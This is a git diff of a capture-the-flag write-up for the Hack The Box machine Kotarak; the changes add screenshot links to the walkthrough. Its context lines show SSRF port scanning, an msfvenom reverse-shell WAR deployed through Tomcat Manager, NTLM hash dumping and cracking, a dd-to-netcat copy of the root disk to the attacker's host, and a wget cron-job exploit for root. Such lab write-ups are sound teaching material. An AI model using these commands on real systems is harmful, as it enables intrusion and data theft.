@@ -1,5 +1,5 @@
 # Kotarak [HTB](https://app.hackthebox.com/machines/101)
-![kotarak-01]()
+![kotarak-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/kotarak-01.png)
 
 ## Recon
 
@@ -9,7 +9,7 @@ After adding the target to my `/etc/hosts` file I start scanning for open ports:
 nmap -p- --min-rate 10000 kotarak.htb
 ```
 
-![ports-02]()
+![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ports-02.png)
 
 
 Next, I run a version detection scan againts the found ports:
@@ -18,7 +18,7 @@ Next, I run a version detection scan againts the found ports:
 nmap -p 22,8009,8080,60000 -sCV kotarak.htb -oN nmap.result
 ```
 
-![nmap-res-03]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/nmap-res-03.png)
 
 
 We have the following:
@@ -46,12 +46,12 @@ With all of that said, let's start with the Apache server on port 60000.
 
 If we browse towards `http://kotarak.htb:60000/` we see the following:
 
-![site-04]()
+![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/site-04.png)
 
 
 All three links in the page are empty, and we have what looks like an input field. I wans't sure what to input exactly, so I took a look at the srouce code and saw the following form:
 
-![source-form-05]()
+![source-form-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/source-form-05.png)
 
 
 This form saves our input to the `path` parameter, and redirects it to the `url.php` script which should retrieve said URL on our behalf and print out the results. In essence giving us a `"private browser"`.
@@ -71,17 +71,17 @@ My first instinct was to serve [pentestmonkey](https://github.com/pentestmonkey/
 
 The target made a connection to retrieve the script:
 
-![retrive-05]()
+![retrive-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/retrive-05.png)
 
 
 But didn't execute it. Rather, the target simply printed the file's contents:
 
-![contents-06]()
+![contents-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/contents-06.png)
 
 
 If we intercept the transaction in Burp proxy, we can see the following:
 
-![intercept-07]()
+![intercept-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/intercept-07.png)
 
 
 The target is treating the retrieved content as HTML, not PHP. I tried changing the content-type header to a valid PHP script value like `application/php`, `text/php` or `application/x-httpd-php-source` but this just returned an empty response from the target. 
@@ -89,12 +89,12 @@ The target is treating the retrieved content as HTML, not PHP. I tried changing 
 
 My next logical step was to try and abuse [PHP wrappers](https://www.php.net/manual/en/wrappers.php). I started by sending a simple `file` wrapper for `/etc/passwd` as such:
 
-![wrapper-08]()
+![wrapper-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/wrapper-08.png)
 
 
 Which provoked the following response:
 
-![try-harder-09]()
+![try-harder-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/try-harder-09.png)
 
 
 At this point I thought I was getting close, and that the way forward is to abuse the PHP wrappers. So I sent more complex forms of payloads like:
@@ -114,12 +114,12 @@ At this point, I decided to run a directory and file scan to see if there is mor
 ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://kotarak.htb:60000/FUZZ -e .txt,.xml,.html,.php
 ```
 
-![ffuf-10]()
+![ffuf-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ffuf-10.png)
 
 
 The `info.php` was the most unexpected, and it displays the result of the `phpinfo()` function:
 
-![phpinfo-11]()
+![phpinfo-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/phpinfo-11.png)
 
 
 In the `Core` section we can see that `file_uploads` is enabled. Which means that if we do manage to find an LFI vulnerability, we can chain this to get [RCE](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo). However my hopes for an `LFI/RFI` vulnerability on this target was starting to dwindle down. 
@@ -139,7 +139,7 @@ In this case, we don't really have an internal network, but we do have web-resou
 
 We can try and point the application towards itself, and see if we can retrieve the `server-staus` page. We can do this by inputting something like this `http://localhost:60000/server-status`:
 
-![server-status-13]()
+![server-status-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/server-status-13.png)
 
 
 We are able to access internal resources through the localhost! 
@@ -156,7 +156,7 @@ At first I tried to get the source code for the `url.php` script with a request 
 
 Then I tried something I knew would fail, which was to request the SSH service running on port 22 with a request like this `http://localhost:22`:
 
-![mismatch-14]()
+![mismatch-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/mismatch-14.png)
 
 
 We got some text as a response. We knew that SSH was enabled on the target, but this text was a confirmation. 
@@ -164,7 +164,7 @@ We got some text as a response. We knew that SSH was enabled on the target, but 
 
 If we try to access a port that's likely to be closed with a request like `http://localhost:6`, we should receive an empty response, confirming that the port is indeed closed:
 
-![empty-15]()
+![empty-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/empty-15.png)
 
 
 So if you think about it, we just found ourselfs an internal port scanner. All we have to do, is write a simple script to test for all 65535 ports, and see what internal services may be running on the internal localhost subnet of the target. 
@@ -193,7 +193,7 @@ Here are the results from the scan:
 
 + Port 90:
 
-![port90-16]()
+![port90-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/port90-16.png)
 
 
 Not super useful.
@@ -201,7 +201,7 @@ Not super useful.
 
 + Port 110:
 
-![port110-17]()
+![port110-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/port110-17.png)
 
 
 Not usper useful either.
@@ -209,7 +209,7 @@ Not usper useful either.
 
 + Port 200: 
 
-![port200-18]()
+![port200-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/port200-18.png)
 
 
 Another empty site.
@@ -217,19 +217,19 @@ Another empty site.
 
 + Port 320:
 
-![login-page-19]()
+![login-page-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/login-page-19.png)
 
 
 This looked interesting. But if we try to login, the request will be sent back to `http://kotarak.htb:60000` instead of the internal site at `http://localhost:320`. So regardless of what we input as the password, we will always get this login page:
 
-![forward-20]()
+![forward-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/forward-20.png)
 
 
 + Port 888
 
 This site however, did turned out to be useful:
 
-![port888-21]()
+![port888-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/port888-21.png)
 
 
 This site seems to be hosting a few files. If we hover over an entry here, we will see a link towards `http://kotarak.htb:60000/url.php?doc=tetris.c`. 
@@ -243,12 +243,12 @@ So if we where to strip this external redirect, and imagine that wer'e accessing
 
 If we input this URL to the `SSRF` site we get the file:
 
-![tetris-22]()
+![tetris-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/tetris-22.png)
 
 
 Let's try to get that backup file. If we request it via the `SSRF` site we will get an empty response. But if we intercept the traffic in Burp proxy, we will see the contents of the file, which turned out to be the `tomcat-users.xml` file:
 
-![backup-23]()
+![backup-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/backup-23.png)
 
 
 Here we see the usernmae and password for the `admin` user. We can also see this user has the `manager`, `manager-gui`, `admin-gui` & `manager-script` Tomcat roles, which should give us complete control over the web-based GUI manager application. 
@@ -257,12 +257,12 @@ Here we see the usernmae and password for the `admin` user. We can also see this
 
 I know that the Tomcat GUI manager app is located at `http://kotarak.htb:8080/manager/html`, so if we open this URL we will be prompted for credentials:
 
-![prompt-24]()
+![prompt-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/prompt-24.png)
 
 
 I use the creds from the backup file and I get in:
 
-![manager-25]()
+![manager-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/manager-25.png)
 
 
 From here we can deploy a WAR application which contains a reverse shell. A common way of exploting Tomcat Manager access to get a shell on the target system.
@@ -277,12 +277,12 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.44 LPORT=443 -f war -o she
 
 Then, in the Manager interface, I select the `WAR` archive and deploy it:
 
-![deploy-26]()
+![deploy-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/deploy-26.png)
 
 
 After we hit `List Applications`, we should see our newly deployed app located at `/rshell`:
 
-![app-27]()
+![app-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/app-27.png)
 
 
 Now I start the local listner with:
@@ -293,7 +293,7 @@ rlwrap nc -lnvp 443
 
 And click on the link which gives me a shell:
 
-![shell-28]()
+![shell-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/shell-28.png)
 
 
 
@@ -310,7 +310,7 @@ Both from the output of the previously ran `hostname` command, as well as from o
 
 I decided to run `ifconfig` to see which interfaces are available on this system, and I saw the following interface:
 
-![ifconfig-28.5]()
+![ifconfig-28.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ifconfig-28.5.png)
 
 
 This looks like a container interface. So we would probably need to get inside the container at some point to root this box. 
@@ -321,7 +321,7 @@ However, since our current user `tomcat` is not a part of the `lxc/lxd` groups, 
 
 To do that I list the contents of the `/home` directory:
 
-![users-29]()
+![users-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/users-29.png)
 
 
 I decided to start with the `tomcat` user since this is our current user access. 
@@ -330,7 +330,7 @@ I decided to start with the `tomcat` user since this is our current user access.
 
 The `/home/tomcat` direcotry has the following directory tree: `to_archive/pentest_data/` which in turn, has two files inside of it:
 
-![tomcat-files-30]()
+![tomcat-files-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/tomcat-files-30.png)
 
 
 One of the files here has a `.dit` extension. The `dit` acronym stands for `Directory Information Tree`, and this type of file is used in Active Directory to store the hierarchy of the domain including information about user objects, groups and group membership, as well as password hashes for all users in the domain.
@@ -362,7 +362,7 @@ ftp> bye
 
 The file upload takes a bit of time but I wait patiently. After a couple of minutes I have both files on my Kali:
 
-![hive-31]()
+![hive-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/hive-31.png)
 
 
 Now we can dump out the NTLM hashes using `secretsdump` from Impacket:
@@ -373,7 +373,7 @@ impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgra
 le ntlm_hashes
 ```
 
-![ntlm-hashes-32]()
+![ntlm-hashes-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ntlm-hashes-32.png)
 
 
 We get the NTLM hashes! 
@@ -381,7 +381,7 @@ We get the NTLM hashes!
 
 If we take `atanas`'s hash and test it in [crackstation](https://crackstation.net/), we can see it cracks to `Password123!`:
 
-![crack-33]()
+![crack-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/crack-33.png)
 
 
 Unfortunately, using this password to login to the SSH server fails! So I tested the `Administrator`s hash in crackstation as well and it cracks to `f16tomcat!`. 
@@ -392,7 +392,7 @@ I used this new password to connect to the SSH server as `atanas` but to no avai
 
 Instead, I tried to get a shell as `atanas` using the `su` command. I found that the `f16tomcat!` password works:
 
-![atanas-34]()
+![atanas-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/atanas-34.png)
 
 
 ### Atanas
@@ -406,7 +406,7 @@ Interacting with block devices is a very high-privileged operation since it invo
 
 If we take a look at `atanas`'s bash history, we can see that `atanas` accessed the `/dev/sda1` partition using `debugfs`:
 
-![history-35]()
+![history-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/history-35.png)
 
 
 Using `debugfs` we can traverse the selected block device with essentially root access, reading any file we want. But the `debugfs` shell is be a bit clunky, and it's not the best idea of exploiting this privilege.
@@ -417,7 +417,7 @@ What we can do instead, is use `dd` to copy the block device that has the root f
 
 Before we do that, we need to understand the block device layout on this system. We can do that by running `lsblk`:
 
-![lsblk-36]()
+![lsblk-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/lsblk-36.png)
 
 
 We can see that we actully have Logical-Volume-Manager or `LVM` deployed on this system. [LVM](https://en.wikipedia.org/wiki/Main_Page) is very cool framework that virtualizes block devices on Unix system, making them much, much easier to administer. 
@@ -445,7 +445,7 @@ Then, we can copy the `/dev/mapper/Kotarak-vg/root` block device, compress it so
 dd if=/dev/Kotarak-vg/root | gzip -1 - | nc 10.10.14.50 445
 ```
 
-![dd-37]()
+![dd-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/dd-37.png)
 
 
 This will take a couple of minutes to complete. Once it's done, we can extract and mount the filesystem on our attack machine using:
@@ -458,7 +458,7 @@ mount rootfs kotarak
 
 I did this on a Ubuntu VM I have, instead of my Kali (I had some spacing issues, which I decided to fix after this box). But here is the filesytem:
 
-![rootfs-38]()
+![rootfs-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/rootfs-38.png)
 
 
 We know from the initial stages of the privilege esacaltion that we have a container somewhere on this system. Typically containers are stored at `/var/lib/docker/` though this path dosen't exists on the system. 
@@ -466,12 +466,12 @@ We know from the initial stages of the privilege esacaltion that we have a conta
 
 But `/var/lib/lxc` does:
 
-![container-39]()
+![container-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/container-39.png)
 
 
 We see a container named `Kotarak-int`, which fits the naming convention of the host system. If we investigate the `root` directory in the container we can find the root flag:
 
-![flag-40]()
+![flag-40](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/flag-40.png)
 
 
 This is very nice, but it's not a root shell.
@@ -484,19 +484,19 @@ Let's fix that!
 
 If we list the permissions of the `/root` directory of the host filesystem, we will see that it's completely open to everyone:
 
-![root-perms-41]()
+![root-perms-41](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/root-perms-41.png)
 
 
 So we can go back to our shell as `atanas` and keep investigating from there:
 
-![files-42]()
+![files-42](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/files-42.png)
 
 
 There are two unusual files here:
 
 + `flag.txt`
 
-![flag-42.5]()
+![flag-42.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/flag-42.5.png)
 
 
 I'm guessing that this is a hint to locate the container and get the root flag from there.
@@ -507,7 +507,7 @@ Not super useful for us right now.
 
 + `app.log`
 
-![app-log-43]()
+![app-log-43](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/app-log-43.png)
 
 
 We can see three requests coming from a `10.0.3.133` host to retrieve `archive.tar.gz`.
@@ -518,7 +518,7 @@ As no port is specified in the requests, we can conclude that it tries to access
 
 The client making these requests is coming from `10.0.3.133`, this is the subnet of our container at `10.0.3.0/24`. If we try to ping this host we get a response:
 
-![ping-44]()
+![ping-44](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ping-44.png)
 
 
 
@@ -616,7 +616,7 @@ At first, I tried to start an HTTP server on the target using python:
 python3 -m http.server 80
 ```
 
-![err-45]()
+![err-45](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/err-45.png)
 
 
 Ok, fair enough...
@@ -634,7 +634,7 @@ Unfortunately, this didn't yield any meaningful results. So instead I decided to
 
 Although I didn't find any new capabilities, I did saw the following:
 
-![peas-46]()
+![peas-46](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/peas-46.png)
 
  
 A quick Google search teels me that this program is desinged to allow low-privilge users to bind sockets to high-privileged ports :D
@@ -642,7 +642,7 @@ A quick Google search teels me that this program is desinged to allow low-privil
 
 If we check the permissions to this program we can see it's only accessible by our user `atanas`:
 
-![ll-47]()
+![ll-47](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ll-47.png)
 
 
 So now we can add the `authbind` command to our python server and we should be able to start a socket on port 80:
@@ -654,7 +654,7 @@ authbind python3 -m http.server 80
 
 And just a couple of seconds later I receive a connection from `10.0.3.133`:
 
-![conn-48]()
+![conn-48](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/conn-48.png)
 
 
 So now can confirm that there is a cronjob running from inside the container that makes these requests, and we can bind to low ports, so we can probably exploit this! 
@@ -674,14 +674,14 @@ output_document = /etc/cron.d/wget-root-shell
 _EOF_
 ```
 
-![wgetrc-49]()
+![wgetrc-49](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/wgetrc-49.png)
 
 
 2) Copy the exploit and modify it. 
 
 We can just copy the exploit from the POC to our attack machine and make the following changes:
 
-![changes-50]()
+![changes-50](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/changes-50.png)
 
 
 I upadted the HTTP and FTP servers settings, and I replaced the cronjob payload with a reverse shell payload which I verified that works beforehand. 
@@ -710,7 +710,7 @@ For this we need to start another shell on the target in order to run the FTP se
 autbind python -m pyftpdlib 
 ```
 
-![start-ftp-51]()
+![start-ftp-51](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/start-ftp-51.png)
 
 
 Looks good. 
@@ -735,19 +735,19 @@ authbind python wget-exploit.py
 
 Initially, we get the original GET request:
 
-![initial-http-52]()
+![initial-http-52](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/initial-http-52.png)
 
 
 The exploit redirected the cronjob over to our FTP server which caught the request and served our malicious `.wgetrc` file:
 
-![initial-ftp-53]()
+![initial-ftp-53](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ftp-initial-53.png)
 
 
 Less then a minute afterwards, I receive the second request:
 
-![second-http-53]()
+![second-http-53](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/http-second-53.png)
 
-![second-http-54]()
+![second-http-54](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/second-http-54.png)
 
 
 Our HTTP server caught the request and redirected back to the FTP. Which this time, served the malicious cronjob we created. 
@@ -755,7 +755,4 @@ Our HTTP server caught the request and redirected back to the FTP. Which this ti
 
 Then after a few seconds I got a connection from root on my netcat listener:
 
-![root-55]()
-
-
-
+![root-55](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/root-55.png)
